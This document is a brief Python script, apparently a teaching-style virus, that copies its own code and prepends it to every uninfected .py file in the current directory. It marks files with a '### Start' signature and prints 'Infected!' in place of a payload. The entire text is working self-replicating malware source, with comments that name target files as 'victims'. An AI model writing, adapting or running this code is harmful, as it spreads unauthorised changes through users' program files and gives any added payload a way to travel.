### Start

import sys, glob, re

# Get a copy
v = []
f = open(sys.argv[0], "r")
lines = f.readlines()
f.close()

tmp = False

for line in lines:
    if re.search("^### Start", line):
        tmp = True
    if tmp is True:
        v.append(line)
    if re.search("^### End", line):
        break

# Find Potential Victims
progs = glob.glob("*.py")

# Check and Infect
for prog in progs:
    f = open(prog, "r")
    p = f.readlines()
    f.close()
    infected = False
    for line in p:
        if "### Start" in line:
            infected = True
            break
    if not infected:
        n = []
        n.extend(v)
        n.extend(p)
        f = open(prog, "w")
        f.writelines(n)
        f.close()

# Optional Payload
print("Infected!")

### END
